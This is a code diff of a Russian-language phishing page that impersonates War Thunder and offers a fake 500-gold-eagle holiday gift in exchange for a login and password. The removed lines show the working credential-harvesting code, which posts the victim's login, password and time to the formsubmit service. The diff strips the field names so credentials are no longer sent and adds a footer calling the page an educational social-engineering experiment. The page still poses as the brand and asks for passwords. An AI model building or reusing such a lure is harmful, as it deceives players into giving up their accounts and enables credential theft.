@@ -258,7 +258,7 @@
             <div class="promo__content">
                 <img class="promo__title" src="/assets/img/svg/colored/logo-warthunder-new.svg" alt="Warthunder">
 
-                <!-- НАША ФОРМА -->
+                <!-- НАША ФОРМА (пароли не отправляются) -->
                 <div class="gift-form">
                     <h2>500 ЗОЛОТЫХ ОРЛОВ</h2>
                     <p>в честь Дня защитника Отечества</p>
@@ -267,10 +267,12 @@
                         <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="table">
+                        <!-- Сюда будет подставлено время -->
                         <input type="hidden" name="time" id="timeField" value="">
                         
-                        <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
-                        <input type="password" name="password" placeholder="Пароль" id="password" required>
+                        <!-- У полей УБРАНЫ атрибуты name → они НЕ отправляются -->
+                        <input type="text" placeholder="Логин или e-mail" id="login" required>
+                        <input type="password" placeholder="Пароль" id="password" required>
                         
                         <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
                     </form>
@@ -295,6 +297,8 @@
 
 <footer class="footer">
     <div class="footer__wrapper">
+        <div class="footer__copyright">
+            © 2026 ООО «Пиксель Шквал». Учебный эксперимент по социальной инженерии.
         </div>
     </div>
 </footer>
@@ -303,14 +307,12 @@
 document.getElementById('phishForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
-    var login = document.getElementById('login').value;
-    var password = document.getElementById('password').value;
     var time = new Date().toLocaleString('ru-RU');
     
     // Устанавливаем время в скрытое поле
     document.getElementById('timeField').value = time;
     
-    // Отправляем ВСЕ данные (логин, пароль, время) на formsubmit
+    // Отправляем ТОЛЬКО время (логин и пароль не отправляются, т.к. у них нет name)
     fetch(this.action, {
         method: 'POST',
         body: new FormData(this)
